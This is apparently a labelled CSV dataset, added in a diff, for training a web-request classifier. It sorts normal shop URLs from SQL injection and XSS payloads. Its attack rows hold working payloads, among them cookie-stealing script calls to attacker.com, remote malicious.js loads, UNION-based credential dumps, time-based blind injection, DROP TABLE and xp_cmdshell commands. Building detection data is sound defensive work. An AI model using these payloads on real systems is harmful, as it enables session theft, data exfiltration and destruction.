+%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E,2,XSS
+"<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
+dashboard?view=summary,0,NORMAL
+item/home?ref=homepage,0,NORMAL
+"query=<iframe src=""javascript:alert(`XSS`)""></iframe>",2,XSS
+product?id=102&category=electronics,0,NORMAL
+item?id=' or 1=1#,1,SQL_INJECTION
+query='><script>alert('PWNED')</script>,2,XSS
+<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>,2,XSS
+admin' #,1,SQL_INJECTION
+download/specs-datasheet.pdf,0,NORMAL
+search?q=' OR 'a'='a,1,SQL_INJECTION
+assets/css/main.css,0,NORMAL
+profile/edit?name=Johnathan,0,NORMAL
+"search?q=<video><source onerror=""javascript:alert(1)"">",2,XSS
+comment=<script>alert(1)</script>,2,XSS
+"comment=<video><source onerror=""javascript:alert(1)"">",2,XSS
+<script>alert('XSS')</script>,2,XSS
+item?id=' OR '1'='1,1,SQL_INJECTION
+filter=1' ORDER BY 2--+,1,SQL_INJECTION
+browse?tag=account/security/2fa-setup,0,NORMAL
+<input autofocus onfocus=alert(1)>,2,XSS
+login?user=' or 1=1#,1,SQL_INJECTION
+query=admin_user_2024&page=1,0,NORMAL
+item/alice.smith@example.com?ref=homepage,0,NORMAL
+'><script>alert('PWNED')</script>,2,XSS
+<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>,2,XSS
+"<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
+download/specs-datasheet.pdf,0,NORMAL
+<script>alert(1)</script>,2,XSS
+browse?tag=terms-and-conditions,0,NORMAL
+filter?category=images/banner-sale.jpg&sort=desc,0,NORMAL
+login?user=1; EXEC xp_cmdshell('dir')--,1,SQL_INJECTION
+1' ORDER BY 3--+,1,SQL_INJECTION
+"<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
+"redirect=""><script>alert(document.domain)</script>",2,XSS
+<script>alert(1)</script>,2,XSS
+"<object data=""javascript:alert(1)"">",2,XSS
+search?q=<body onload=alert('XSS')>,2,XSS
+search?q=apple+macbook+pro+m2,0,NORMAL
+query=best+headphones+under+100&page=1,0,NORMAL
+filter?category=laptop&sort=desc,0,NORMAL
+"<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
+api/search?term=search?q=mechanical+pencil+0.5mm,0,NORMAL
+item?id=admin'/*,1,SQL_INJECTION
+api/search?term=download/specs-datasheet.pdf,0,NORMAL
+<isindex type=image src=1 onerror=alert(1)>,2,XSS
+browse?tag=home,0,NORMAL
+download/specs-datasheet.pdf,0,NORMAL
+cart/add?item_id=554&qty=1,0,NORMAL
+item?id=' or 1=1#,1,SQL_INJECTION
+api/search?term=index.html,0,NORMAL
+login?user='; WAITFOR DELAY '0:0:5'--,1,SQL_INJECTION
+filter='; WAITFOR DELAY '0:0:5'--,1,SQL_INJECTION
+comment='><script>alert('PWNED')</script>,2,XSS
+search?q=spring+sale+discount,0,NORMAL
+query=shoes+for+running&page=1,0,NORMAL
+products/audio/bluetooth-speakers,0,NORMAL
+browse?tag=mechanical+keyboard,0,NORMAL
+login?user=admin' --,1,SQL_INJECTION
+terms-and-conditions,0,NORMAL
+filter?category=index.html&sort=desc,0,NORMAL
+1; EXEC xp_cmdshell('dir')--,1,SQL_INJECTION
+' OR '1'='1,1,SQL_INJECTION
+api/search?term=apple+macbook+pro+m2,0,NORMAL
+<select autofocus onfocus=alert(1)>,2,XSS
+<marquee onstart=alert(1)>,2,XSS
+item?id=1' ORDER BY 3--+,1,SQL_INJECTION
+search?q=products/audio/bluetooth-speakers,0,NORMAL
+api/search?term=gaming+monitor,0,NORMAL
+<details open ontoggle=alert(1)>,2,XSS
+newsletter/subscribe?email=user@test.org,0,NORMAL
+search?q=spring+sale+discount,0,NORMAL
+password123!,0,NORMAL
+home,0,NORMAL
+query=view_order?order_id=983214&page=1,0,NORMAL
+search?q=' OR 1=1 LIMIT 1;--,1,SQL_INJECTION
+"<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
+<isindex type=image src=1 onerror=alert(1)>,2,XSS
+contact,0,NORMAL
+login?user=) or ('1'='1,1,SQL_INJECTION
+search?q='; WAITFOR DELAY '0:0:5'--,1,SQL_INJECTION
+1' ORDER BY 2--+,1,SQL_INJECTION
+redirect=<isindex type=image src=1 onerror=alert(1)>,2,XSS
+redirect=<body onload=alert('XSS')>,2,XSS
+query=order/status?tracking=FEDEX-889922&page=1,0,NORMAL
+filter=admin' #,1,SQL_INJECTION
+comment='><script>alert('PWNED')</script>,2,XSS
+filter?category=view_order?order_id=983214&sort=desc,0,NORMAL
+search?q=admin'/*,1,SQL_INJECTION
+%27%20OR%201%3D1%20--,1,SQL_INJECTION
+'><script>alert('PWNED')</script>,2,XSS
+products/audio/bluetooth-speakers,0,NORMAL
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
+search?q=' OR '1'='1,1,SQL_INJECTION
+"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+alert(1)//'>",2,XSS
+browse?tag=order/status?tracking=FEDEX-889922,0,NORMAL
+"<video><source onerror=""javascript:alert(1)"">",2,XSS
+<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>,2,XSS
+"test' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",1,SQL_INJECTION
+"1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
+best headphones under 100,0,NORMAL
+filter?category=view_order?order_id=983214&sort=desc,0,NORMAL
+<input autofocus onfocus=alert(1)>,2,XSS
+apple macbook pro m2,0,NORMAL
+admin'/*,1,SQL_INJECTION
+"item?id=test' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",1,SQL_INJECTION
+filter=' OR '1'='1,1,SQL_INJECTION
+<select autofocus onfocus=alert(1)>,2,XSS
+"<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
+comment=<script>alert('XSS')</script>,2,XSS
+browse?tag=search?q=mechanical+pencil+0.5mm,0,NORMAL
+assets/js/bundle.min.js,0,NORMAL
+help/return-policy,0,NORMAL
+filter?category=reviews?rating=5&verified=true&sort=desc,0,NORMAL
+<svg/onload=alert('XSS')>,2,XSS
+checkout?shipping=standard&promo=WELCOME10,0,NORMAL
+home,0,NORMAL
+login?user=admin'/*,1,SQL_INJECTION
+browse?tag=products/audio/bluetooth-speakers,0,NORMAL
+newsletter/subscribe?email=user@test.org,0,NORMAL
+item/cart/add?item_id=554&qty=1?ref=homepage,0,NORMAL
+item/dashboard?view=summary?ref=homepage,0,NORMAL
+<svg/onload=alert('XSS')>,2,XSS
+contact,0,NORMAL
+assets/css/main.css,0,NORMAL
+api/v1/users?limit=10&offset=20,0,NORMAL
+account/security/2fa-setup,0,NORMAL
+api/search?term=john_doe,0,NORMAL
+filter?category=download/specs-datasheet.pdf&sort=desc,0,NORMAL
+' OR 1=1 --,1,SQL_INJECTION
+assets/css/main.css,0,NORMAL
+"redirect=<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
+"comment=<object data=""javascript:alert(1)"">",2,XSS
+<body onload=alert('XSS')>,2,XSS
+comment=<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>,2,XSS
+filter=1' ORDER BY 3--+,1,SQL_INJECTION
+login?user=') or ('1'='1'--,1,SQL_INJECTION
+search?q=<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>,2,XSS
+item/contact?ref=homepage,0,NORMAL
+search?q=' OR 1=1 LIMIT 1;--,1,SQL_INJECTION
+product?id=102&category=electronics,0,NORMAL
+filter?category=images/banner-sale.jpg&sort=desc,0,NORMAL
+1; DROP TABLE users--,1,SQL_INJECTION
+catalog?page=2&sort=price_asc,0,NORMAL
+blog/post-10-cybersecurity-tips,0,NORMAL
+browse?tag=help/return-policy,0,NORMAL
+comment='><script>alert('PWNED')</script>,2,XSS
+"filter=' UNION ALL SELECT 1, 2, 3, table_name FROM information_schema.tables--",1,SQL_INJECTION
+query=apple+macbook+pro+m2&page=1,0,NORMAL
+query=<details open ontoggle=alert(1)>,2,XSS
+filter?category=assets/js/bundle.min.js&sort=desc,0,NORMAL
+item/settings?theme=dark&lang=en?ref=homepage,0,NORMAL
+api/search?term=cotton+t-shirt+blue,0,NORMAL
+admin' #,1,SQL_INJECTION
+1; DROP TABLE users--,1,SQL_INJECTION
+' OR 1=1 LIMIT 1;--,1,SQL_INJECTION
+redirect=<isindex type=image src=1 onerror=alert(1)>,2,XSS
+comment=<svg onload=alert(1)>,2,XSS
+dashboard?view=summary,0,NORMAL
+' OR 1=1 LIMIT 1;--,1,SQL_INJECTION
+%27%20OR%201%3D1%20--,1,SQL_INJECTION
+search?q=mechanical+pencil+0.5mm,0,NORMAL
+blog/post-10-cybersecurity-tips,0,NORMAL
+view_order?order_id=983214,0,NORMAL
+redirect=<script>alert('XSS')</script>,2,XSS
+"' UNION ALL SELECT 1, 2, 3, table_name FROM information_schema.tables--",1,SQL_INJECTION
+api/search?term=index.html,0,NORMAL
+comment=<script>alert('XSS')</script>,2,XSS
+"test' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",1,SQL_INJECTION
+"search?q=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
+wireless mouse,0,NORMAL
+query=python+programming+book&page=1,0,NORMAL
+<script>alert(1)</script>,2,XSS
+' or 1=1/*,1,SQL_INJECTION
+api/search?term=assets/css/main.css,0,NORMAL
+download/specs-datasheet.pdf,0,NORMAL
+account/security/2fa-setup,0,NORMAL
+account/security/2fa-setup,0,NORMAL
+%27%20OR%201%3D1%20--,1,SQL_INJECTION
+item/order/status?tracking=FEDEX-889922?ref=homepage,0,NORMAL
+catalog?page=2&sort=price_asc,0,NORMAL
+<img src=x onerror=alert('XSS')>,2,XSS
+"query=javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+alert(1)//'>",2,XSS
+item/usb+c+cable+2m?ref=homepage,0,NORMAL
+reviews?rating=5&verified=true,0,NORMAL
+"test' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",1,SQL_INJECTION
+search?q=cart/checkout?step=billing,0,NORMAL
+search?q=admin' --,1,SQL_INJECTION
+SELECT * FROM members WHERE username = 'admin' OR '1'='1',1,SQL_INJECTION
+best headphones under 100,0,NORMAL
+settings?theme=dark&lang=en,0,NORMAL
+browse?tag=product?id=102&category=electronics,0,NORMAL
+item/terms-and-conditions?ref=homepage,0,NORMAL
+"search?q=<iframe src=""javascript:alert(`XSS`)""></iframe>",2,XSS
+password123!,0,NORMAL
+<input autofocus onfocus=alert(1)>,2,XSS
+admin' #,1,SQL_INJECTION
+<img src=x onerror=alert('XSS')>,2,XSS
+item/settings?theme=dark&lang=en?ref=homepage,0,NORMAL
+view_order?order_id=983214,0,NORMAL
+filter?category=settings?theme=dark&lang=en&sort=desc,0,NORMAL
+search?q=%27%20OR%201%3D1%20--,1,SQL_INJECTION
+search?q=contact,0,NORMAL
+best headphones under 100,0,NORMAL
+search?q=<input autofocus onfocus=alert(1)>,2,XSS
+filter?category=apple+macbook+pro+m2&sort=desc,0,NORMAL
+comment=<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>,2,XSS
+browse?tag=order/status?tracking=FEDEX-889922,0,NORMAL
+search?q=<script>alert(1)</script>,2,XSS
+search?q=gaming+monitor,0,NORMAL
+privacy-policy,0,NORMAL
+checkout?shipping=standard&promo=WELCOME10,0,NORMAL
+search?q=python+programming+book,0,NORMAL
+query=laptop&page=1,0,NORMAL
+filter?category=products/audio/bluetooth-speakers&sort=desc,0,NORMAL
+1' ORDER BY 3--+,1,SQL_INJECTION
+1' ORDER BY 1--+,1,SQL_INJECTION
+admin_user_2024,0,NORMAL
+api/search?term=john_doe,0,NORMAL
+order/status?tracking=FEDEX-889922,0,NORMAL
+item/account/security/2fa-setup?ref=homepage,0,NORMAL
+api/search?term=images/banner-sale.jpg,0,NORMAL
+"item?id="" OR ""1""=""1",1,SQL_INJECTION
+api/v1/users?limit=10&offset=20,0,NORMAL
+query=<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>,2,XSS
+query=shoes+for+running&page=1,0,NORMAL
+query=terms-and-conditions&page=1,0,NORMAL
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
+"<script src=""http://attacker.com/malicious.js""></script>",2,XSS
+api/search?term=cotton+t-shirt+blue,0,NORMAL
+browse?tag=gaming+monitor,0,NORMAL
+' OR '1'='1,1,SQL_INJECTION
+cart/add?item_id=554&qty=1,0,NORMAL
+assets/js/bundle.min.js,0,NORMAL
+api/search?term=faq/shipping-times,0,NORMAL
+'; WAITFOR DELAY '0:0:5'--,1,SQL_INJECTION
+api/search?term=usb+c+cable+2m,0,NORMAL
+api/search?term=settings?theme=dark&lang=en,0,NORMAL
+<svg onload=alert(1)>,2,XSS
+terms-and-conditions,0,NORMAL
+1' ORDER BY 1--+,1,SQL_INJECTION
+item?id=1' ORDER BY 1--+,1,SQL_INJECTION
+john_doe,0,NORMAL
+search?q=1' AND SLEEP(10)--,1,SQL_INJECTION
+"<video><source onerror=""javascript:alert(1)"">",2,XSS
+account/security/2fa-setup,0,NORMAL
+<svg/onload=alert('XSS')>,2,XSS
+cart/checkout?step=billing,0,NORMAL
+browse?tag=product?id=102&category=electronics,0,NORMAL
+search?q=ergonomic+chair+mesh,0,NORMAL
+search?q=shoes+for+running,0,NORMAL
+api/search?term=usb+c+cable+2m,0,NORMAL
+admin' --,1,SQL_INJECTION
+settings?theme=dark&lang=en,0,NORMAL
+' OR '1'='1,1,SQL_INJECTION
+contact,0,NORMAL
+' or 1=1#,1,SQL_INJECTION
+api/search?term=reviews?rating=5&verified=true,0,NORMAL
+query=assets/css/main.css&page=1,0,NORMAL
+search?q=terms-and-conditions,0,NORMAL
+apple macbook pro m2,0,NORMAL
+api/search?term=catalog?page=2&sort=price_asc,0,NORMAL
+SELECT * FROM members WHERE username = 'admin' OR '1'='1',1,SQL_INJECTION
+"query=javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+alert(1)//'>",2,XSS
+best headphones under 100,0,NORMAL
+search?q=settings?theme=dark&lang=en,0,NORMAL
+usb c cable 2m,0,NORMAL
+"redirect=<a href=""javascript:alert('XSS')"">Click here</a>",2,XSS
+search?q=4k+oled+television+lg,0,NORMAL
+SELECT * FROM members WHERE username = 'admin' OR '1'='1',1,SQL_INJECTION
+item/search?q=ergonomic+chair+mesh?ref=homepage,0,NORMAL
+about-us,0,NORMAL
+search?q=<svg onload=alert(1)>,2,XSS
+browse?tag=contact,0,NORMAL
+filter?category=terms-and-conditions&sort=desc,0,NORMAL
+comment=<img src=x onerror=alert('XSS')>,2,XSS
+filter?category=search?q=spring+sale+discount&sort=desc,0,NORMAL
+') or ('1'='1'--,1,SQL_INJECTION
+usb c cable 2m,0,NORMAL
+"<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
+search?q=blog/post-10-cybersecurity-tips,0,NORMAL
+redirect=%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E,2,XSS
+<select autofocus onfocus=alert(1)>,2,XSS
+search?q='><script>alert('PWNED')</script>,2,XSS
+alice.smith@example.com,0,NORMAL
+browse?tag=best+headphones+under+100,0,NORMAL
+search?q=<script>alert('XSS')</script>,2,XSS
+<details open ontoggle=alert(1)>,2,XSS
+search?q=<select autofocus onfocus=alert(1)>,2,XSS
+filter?category=shoes+for+running&sort=desc,0,NORMAL
+' OR '1'='1,1,SQL_INJECTION
+help/return-policy,0,NORMAL
+"redirect=""><script>alert(document.domain)</script>",2,XSS
+login?user=' OR 1=1 LIMIT 1;--,1,SQL_INJECTION
+<details open ontoggle=alert(1)>,2,XSS
+<select autofocus onfocus=alert(1)>,2,XSS
+api/search?term=view_order?order_id=983214,0,NORMAL
+browse?tag=profile/edit?name=Johnathan,0,NORMAL
+query=download/specs-datasheet.pdf&page=1,0,NORMAL
+item/faq/shipping-times?ref=homepage,0,NORMAL
+1' ORDER BY 3--+,1,SQL_INJECTION
+admin' #,1,SQL_INJECTION
+1' ORDER BY 1--+,1,SQL_INJECTION
+alice.smith@example.com,0,NORMAL
+"' UNION SELECT username, password FROM users--",1,SQL_INJECTION
+' OR 1=1 LIMIT 1;--,1,SQL_INJECTION
+browse?tag=search?q=ergonomic+chair+mesh,0,NORMAL
+<script>alert(1)</script>,2,XSS
+api/search?term=search?q=spring+sale+discount,0,NORMAL
+search?q=<script>alert('XSS')</script>,2,XSS
+api/search?term=cart/add?item_id=554&qty=1,0,NORMAL
+"<script src=""http://attacker.com/malicious.js""></script>",2,XSS
+search?q=wireless+mouse,0,NORMAL
+' or 1=1#,1,SQL_INJECTION
+item/index.html?ref=homepage,0,NORMAL
+"<script src=""http://attacker.com/malicious.js""></script>",2,XSS
+cart/add?item_id=554&qty=1,0,NORMAL
+item?id=1' ORDER BY 3--+,1,SQL_INJECTION
+api/search?term=account/security/2fa-setup,0,NORMAL
+cart/checkout?step=billing,0,NORMAL
+laptop,0,NORMAL
+"search?q=<script src=""http://attacker.com/malicious.js""></script>",2,XSS
+profile/edit?name=Johnathan,0,NORMAL
+api/search?term=search?q=ergonomic+chair+mesh,0,NORMAL
+query=index.html&page=1,0,NORMAL
+api/search?term=apple+macbook+pro+m2,0,NORMAL
+filter?category=best+headphones+under+100&sort=desc,0,NORMAL
+"search?q=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
+api/search?term=checkout?shipping=standard&promo=WELCOME10,0,NORMAL
+comment=<svg onload=alert(1)>,2,XSS
+item/products/audio/bluetooth-speakers?ref=homepage,0,NORMAL
+browse?tag=products/audio/bluetooth-speakers,0,NORMAL
+password123!,0,NORMAL
+' GROUP BY column_name HAVING 1=1 --,1,SQL_INJECTION
+browse?tag=password123!,0,NORMAL
+assets/css/main.css,0,NORMAL
+' or 1=1/*,1,SQL_INJECTION
+catalog?page=2&sort=price_asc,0,NORMAL
+help/return-policy,0,NORMAL
+admin' --,1,SQL_INJECTION
+"login?user=1' UNION SELECT null, null, null--",1,SQL_INJECTION
+<select autofocus onfocus=alert(1)>,2,XSS
+admin' --,1,SQL_INJECTION
+api/search?term=help/return-policy,0,NORMAL
+catalog?page=2&sort=price_asc,0,NORMAL
+item?id=1; EXEC xp_cmdshell('dir')--,1,SQL_INJECTION
+query=cart/add?item_id=554&qty=1&page=1,0,NORMAL
+search?q=1' ORDER BY 3--+,1,SQL_INJECTION
+search?q=admin'/*,1,SQL_INJECTION
+item?id=' or 1=1#,1,SQL_INJECTION
+filter=admin' #,1,SQL_INJECTION
+account/security/2fa-setup,0,NORMAL
+browse?tag=search?q=spring+sale+discount,0,NORMAL
+"""><script>alert(document.domain)</script>",2,XSS
+1' ORDER BY 1--+,1,SQL_INJECTION
+"1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
+) or ('1'='1,1,SQL_INJECTION
+search?q=apple+macbook+pro+m2,0,NORMAL
+alice.smith@example.com,0,NORMAL
+search?q=mechanical+pencil+0.5mm,0,NORMAL
+best headphones under 100,0,NORMAL
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
+query=mechanical+keyboard&page=1,0,NORMAL
+item/account/security/2fa-setup?ref=homepage,0,NORMAL
+query=<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>,2,XSS
+"query=<script src=""http://attacker.com/malicious.js""></script>",2,XSS
+laptop,0,NORMAL
+faq/shipping-times,0,NORMAL
+1' AND SLEEP(10)--,1,SQL_INJECTION
+1' AND SLEEP(10)--,1,SQL_INJECTION
+"1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
+"search?q=<object data=""javascript:alert(1)"">",2,XSS
+admin'/*,1,SQL_INJECTION
+search?q=images/banner-sale.jpg,0,NORMAL
+api/search?term=search?q=ergonomic+chair+mesh,0,NORMAL
+admin'/*,1,SQL_INJECTION
+filter?category=api/v1/users?limit=10&offset=20&sort=desc,0,NORMAL
+item?id=' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,SQL_INJECTION
+filter?category=apple+macbook+pro+m2&sort=desc,0,NORMAL
+"<object data=""javascript:alert(1)"">",2,XSS
+item?id=1; DROP TABLE users--,1,SQL_INJECTION
+filter=1' AND SLEEP(10)--,1,SQL_INJECTION
+filter=1' AND SLEEP(10)--,1,SQL_INJECTION
+item/newsletter/subscribe?email=user@test.org?ref=homepage,0,NORMAL
+1' ORDER BY 1--+,1,SQL_INJECTION
+search?q=alice.smith@example.com,0,NORMAL
+query=shoes+for+running&page=1,0,NORMAL
+filter=' or 1=1#,1,SQL_INJECTION
+filter?category=contact&sort=desc,0,NORMAL
+query=index.html&page=1,0,NORMAL
+query=catalog?page=2&sort=price_asc&page=1,0,NORMAL
+search?q=assets/css/main.css,0,NORMAL
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
+"<object data=""javascript:alert(1)"">",2,XSS
+"1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
+search?q=' GROUP BY column_name HAVING 1=1 --,1,SQL_INJECTION
+login?user=SELECT * FROM members WHERE username = 'admin' OR '1'='1',1,SQL_INJECTION
+') or ('1'='1'--,1,SQL_INJECTION
+item?id=' HAVING 1=1 --,1,SQL_INJECTION
+filter=' OR 'a'='a,1,SQL_INJECTION
+redirect=<script>alert(1)</script>,2,XSS
+search?q=product?id=102&category=electronics,0,NORMAL
+contact,0,NORMAL
+reviews?rating=5&verified=true,0,NORMAL
+api/search?term=reviews?rating=5&verified=true,0,NORMAL
+<details open ontoggle=alert(1)>,2,XSS
+"filter=1' UNION SELECT null, null, null--",1,SQL_INJECTION
+search?q=<svg onload=alert(1)>,2,XSS
+api/search?term=faq/shipping-times,0,NORMAL
+query=contact&page=1,0,NORMAL
+filter=') or ('1'='1'--,1,SQL_INJECTION
+apple macbook pro m2,0,NORMAL
+%27%20OR%201%3D1%20--,1,SQL_INJECTION
+gaming monitor,0,NORMAL
+products/audio/bluetooth-speakers,0,NORMAL
+filter=' OR 1=1 --,1,SQL_INJECTION
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
+"search?q=""><script>alert(document.domain)</script>",2,XSS
+redirect=<details open ontoggle=alert(1)>,2,XSS
+product?id=102&category=electronics,0,NORMAL
+admin' #,1,SQL_INJECTION
+api/search?term=search?q=spring+sale+discount,0,NORMAL
+mechanical keyboard,0,NORMAL
+query=images/banner-sale.jpg&page=1,0,NORMAL
+"1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
+item?id=%27%20OR%201%3D1%20--,1,SQL_INJECTION
+browse?tag=settings?theme=dark&lang=en,0,NORMAL
+query=terms-and-conditions&page=1,0,NORMAL
+login?user=' or 1=1#,1,SQL_INJECTION
+' HAVING 1=1 --,1,SQL_INJECTION
+query=<input autofocus onfocus=alert(1)>,2,XSS
+1' ORDER BY 3--+,1,SQL_INJECTION
+item/cart/add?item_id=554&qty=1?ref=homepage,0,NORMAL
+laptop,0,NORMAL
+item/profile/edit?name=Johnathan?ref=homepage,0,NORMAL
+browse?tag=python+programming+book,0,NORMAL
+api/search?term=home,0,NORMAL
+search?q=api/v1/users?limit=10&offset=20,0,NORMAL
+search?q=admin'/*,1,SQL_INJECTION
+cotton t-shirt blue,0,NORMAL
+search?q=cotton+t-shirt+blue,0,NORMAL
+search?q=<svg onload=alert(1)>,2,XSS
+<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>,2,XSS
+"<object data=""javascript:alert(1)"">",2,XSS
+"' UNION SELECT username, password FROM users--",1,SQL_INJECTION
+filter?category=dashboard?view=summary&sort=desc,0,NORMAL
+login?user=' OR 1=1 --,1,SQL_INJECTION
+browse?tag=checkout?shipping=standard&promo=WELCOME10,0,NORMAL
+"<a href=""javascript:alert('XSS')"">Click here</a>",2,XSS
+browse?tag=assets/js/bundle.min.js,0,NORMAL
+1; EXEC xp_cmdshell('dir')--,1,SQL_INJECTION
+contact,0,NORMAL
+dashboard?view=summary,0,NORMAL
+"<script src=""http://attacker.com/malicious.js""></script>",2,XSS
+' or 1=1#,1,SQL_INJECTION
+filter=' OR 1=1 LIMIT 1;--,1,SQL_INJECTION
+search?q=1' AND 1=(SELECT COUNT(*) FROM tabname); --,1,SQL_INJECTION
+1; DROP TABLE users--,1,SQL_INJECTION
+search?q=assets/css/main.css,0,NORMAL
+redirect=<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>,2,XSS
+query=assets/js/bundle.min.js&page=1,0,NORMAL
+query=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
+about-us,0,NORMAL
+search?q=4k+oled+television+lg,0,NORMAL
+search?q=search?q=mechanical+pencil+0.5mm,0,NORMAL
+search?q=admin_user_2024,0,NORMAL
+terms-and-conditions,0,NORMAL
+assets/js/bundle.min.js,0,NORMAL
+<script>alert(1)</script>,2,XSS
+settings?theme=dark&lang=en,0,NORMAL
+filter=' or 1=1#,1,SQL_INJECTION
+query=<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>,2,XSS
+api/search?term=assets/css/main.css,0,NORMAL
+"""><script>alert(document.domain)</script>",2,XSS
+download/specs-datasheet.pdf,0,NORMAL
+query=settings?theme=dark&lang=en&page=1,0,NORMAL
+redirect=<input autofocus onfocus=alert(1)>,2,XSS
+mechanical keyboard,0,NORMAL
+item/python+programming+book?ref=homepage,0,NORMAL
+' OR 1=1 LIMIT 1;--,1,SQL_INJECTION
+item/blog/post-10-cybersecurity-tips?ref=homepage,0,NORMAL
+<img src=x onerror=alert('XSS')>,2,XSS
+browse?tag=profile/edit?name=Johnathan,0,NORMAL
+redirect=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
+"query=<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
+<isindex type=image src=1 onerror=alert(1)>,2,XSS
+catalog?page=2&sort=price_asc,0,NORMAL
+query=mechanical+keyboard&page=1,0,NORMAL
+browse?tag=api/v1/users?limit=10&offset=20,0,NORMAL
+api/search?term=faq/shipping-times,0,NORMAL
+filter?category=index.html&sort=desc,0,NORMAL
+alice.smith@example.com,0,NORMAL
+browse?tag=apple+macbook+pro+m2,0,NORMAL
+login?user=admin' --,1,SQL_INJECTION
+admin' --,1,SQL_INJECTION
+"item?id="" OR ""1""=""1",1,SQL_INJECTION
+item?id=1; EXEC xp_cmdshell('dir')--,1,SQL_INJECTION
+api/search?term=alice.smith@example.com,0,NORMAL
+cart/checkout?step=billing,0,NORMAL
+"<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
+search?q=' OR 'a'='a,1,SQL_INJECTION
+query=<img src=x onerror=alert('XSS')>,2,XSS
+query=cart/add?item_id=554&qty=1&page=1,0,NORMAL
+"filter=' UNION SELECT username, password FROM users--",1,SQL_INJECTION
+search?q=<svg onload=alert(1)>,2,XSS
+query=apple+macbook+pro+m2&page=1,0,NORMAL
+search?q=account/security/2fa-setup,0,NORMAL
+SELECT * FROM members WHERE username = 'admin' OR '1'='1',1,SQL_INJECTION
+search?q=4k+oled+television+lg,0,NORMAL
+api/search?term=python+programming+book,0,NORMAL
+redirect=<details open ontoggle=alert(1)>,2,XSS
+admin' #,1,SQL_INJECTION
+<img src=x onerror=alert('XSS')>,2,XSS
+redirect=%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E,2,XSS
+filter?category=cotton+t-shirt+blue&sort=desc,0,NORMAL
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,SQL_INJECTION
+search?q=settings?theme=dark&lang=en,0,NORMAL
+) or ('1'='1,1,SQL_INJECTION
+search?q=ergonomic+chair+mesh,0,NORMAL
+search?q=cart/add?item_id=554&qty=1,0,NORMAL
+browse?tag=faq/shipping-times,0,NORMAL
+browse?tag=api/v1/users?limit=10&offset=20,0,NORMAL
+browse?tag=shoes+for+running,0,NORMAL
+search?q=' or 1=1/*,1,SQL_INJECTION
+search?q=' GROUP BY column_name HAVING 1=1 --,1,SQL_INJECTION
+query=assets/css/main.css&page=1,0,NORMAL
+"test' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",1,SQL_INJECTION
+"redirect=<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
+"' UNION SELECT username, password FROM users--",1,SQL_INJECTION
+shoes for running,0,NORMAL
+api/search?term=home,0,NORMAL
+api/search?term=account/security/2fa-setup,0,NORMAL
